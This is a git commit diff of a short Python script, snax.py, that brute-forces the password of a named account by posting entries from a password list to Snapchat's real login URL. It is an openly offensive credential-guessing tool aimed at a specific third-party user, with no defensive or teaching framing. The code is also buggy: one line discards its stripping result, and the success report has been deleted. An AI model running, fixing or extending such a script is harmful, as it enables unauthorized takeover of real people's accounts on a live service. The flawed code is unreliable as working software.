213dda2e0e257fd98ada55d10184799cc595b7f5
nader <63766463+nader23401n@users.noreply.github.com>
2020-10-29 17:42:06 +0300

    Update snax.py

--- snax.py
+++ snax.py
@@ -1,22 +1,20 @@
 import requests
-def bruteforce(username,url):
+
+
+def bruteforce(username, url):
     for password in passwords:
-        password = passwords.strip()
+        password.strip()
         print('[!! trying to bruteforce password ' + password)
-        
-        
-        resp = requests.post(url,data_dictionary)
-        if "Login failed" in resp.content:
+        data_dictionary = {'username': username,
+                           'password': password, 'log in': 'submit'}
+        resp = requests.post(url, data_dictionary)
+
+        if "That's not the right password." in str(resp.content):
             pass
-        else:
-            print("[+] username is: " + username)
-            print("[+] pasword is: " + password)
-            exit
 
-
-        
-        url = 'https://accounts.snapchat.com/accounts/login?client_id=geo'
+url = 'https://accounts.snapchat.com/accounts/login?client_id=geo'
 username = 'ko50am'
 
-with open('passwords.txt',r)as passwords:
-bruteforce(username,url)
+
+with open('passwords.txt', 'r') as passwords:
+    bruteforce(username, url)
